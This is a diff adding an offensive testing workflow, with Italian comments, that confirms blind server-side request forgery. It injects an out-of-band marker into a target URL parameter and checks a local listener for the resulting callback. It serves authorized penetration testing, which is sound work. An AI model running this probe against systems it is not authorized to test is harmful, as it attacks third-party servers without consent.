@@ -1,0 +1,31 @@
+# Workflow offensivo — attack-blind-ssrf (dialetto workflow)
+# Conferma blind SSRF via canale OOB (knowledge.md, methodology-classes: "the target's fetch is
+# the proof"): il marker OOB viene iniettato nel parametro {param} della richiesta e l'hit sul
+# listener è il PoC. Il marker è DINAMICO: generarlo prima e passarlo in esplicito —
+#   node tools/oob.js listen     (una tantum, infrastruttura locale, foreground/daemon)
+#   node tools/workflow.js run workflows/attack-blind-ssrf.yaml -t <url> \
+#     --var marker=$(node tools/oob.js marker) --var param=<nome-param> --var tag=<nome>
+# Fasi successive (wait + hits) restano all'operatore quando servono ritardi lunghi: qui la
+# verifica hit è immediata, ripetibile con oob.js hits --tail. Auto tier.
+name: attack-blind-ssrf
+description: Conferma blind SSRF via OOB — iniezione marker nel parametro + verifica hit sul listener
+vars:
+  tag: target
+  outdir: reports
+  param: url
+  marker: ""
+steps:
+  - id: inject-marker
+    cmd: node tools/repeater.js --url "{target}?{param}={marker}" --show-body
+    on_error: continue
+    artifacts:
+      - path: "{outdir}/attack-{tag}-ssrf-inject.txt"
+        surface: ssrf
+        from: stdout
+  - id: oob-hits
+    cmd: node tools/oob.js hits --tail 20
+    on_error: continue
+    artifacts:
+      - path: "{outdir}/attack-{tag}-ssrf-hits.txt"
+        surface: ssrf
+        from: stdout
